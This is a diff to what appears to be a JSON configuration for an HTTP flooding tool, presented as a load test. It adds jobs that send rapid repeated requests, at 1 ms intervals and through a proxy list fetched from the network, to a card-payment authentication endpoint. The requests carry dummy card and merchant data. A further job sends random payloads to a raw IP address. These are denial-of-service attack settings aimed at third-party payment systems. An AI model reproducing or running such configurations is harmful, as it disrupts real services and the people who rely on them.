@@ -30,6 +30,34 @@
       "count": 10,
       "args": {
         "method": "GET",
+        "path": "https://ds1.mirconnect.ru:443/sc1/authreq",
+        "body": "version=3.0&pan=YWFhYWFhYWE=&expiry=YWFhYWFhYQ==&deviceCategory=0&purchAmount=100&purchaseDate=20220308+14:11:11&exponent=2&description=aaaaa&currency=643&merchantID=wildberries&merchantCountry=643&xid=MTIzNDEyMzQzMjE0&recurFreq=&recurEnd=&installments=&okUrl=https://ds1.mirconnect.ru/vbv/pareq&failUrl=https://ds1.mirconnect.ru/vbv/pareq&merchantName=wildberries&acqBIN=546901&merchantUrl=http://wildberries.ru/&dsMerchantId=20000000&utid=14999999&digest=YWFhYWFhYWFhYWFh&lastEventGmtTime=2022-03-08+14:11:11.123",
+        "interval_ms": 1,
+        "client": {
+          "async": true,
+          "proxy_urls": "{{ get_proxylist_by_url \"https://raw.githubusercontent.com/arfgdev/LoadTestConfig/main/proxylist.json\" }}"
+        }
+      }
+    },
+    {
+      "type": "http",
+      "count": 10,
+      "args": {
+        "method": "GET",
+        "path": "https://ds1.mirconnect.ru:443/sc1/authreq",
+        "body": "version=3.0&pan=YWFhYWFhYWE=&expiry=YWFhYWFhYQ==&deviceCategory=0&purchAmount=100&purchaseDate=20220308+14:11:11&exponent=2&description=aaaaa&currency=643&merchantID=wildberries&merchantCountry=643&xid=MTIzNDEyMzQzMjE0&recurFreq=&recurEnd=&installments=&okUrl=https://ds1.mirconnect.ru/vbv/pareq&failUrl=https://ds1.mirconnect.ru/vbv/pareq&merchantName=wildberries&acqBIN=546901&merchantUrl=http://wildberries.ru/&dsMerchantId=20000000&utid=14999999&digest=YWFhYWFhYWFhYWFh&lastEventGmtTime=2022-03-08+14:11:11.123",
+        "interval_ms": 1,
+        "client": {
+          "async": true,
+          "proxy_urls": "{{ get_proxylist_by_url \"https://raw.githubusercontent.com/arfgdev/LoadTestConfig/main/proxylist.json\" }}"
+        }
+      }
+    },
+    {
+      "type": "http",
+      "count": 10,
+      "args": {
+        "method": "GET",
         "path": "https://217.20.155.13:443/{{ random_payload 10 }}",
         "interval_ms": 1,
         "client": {
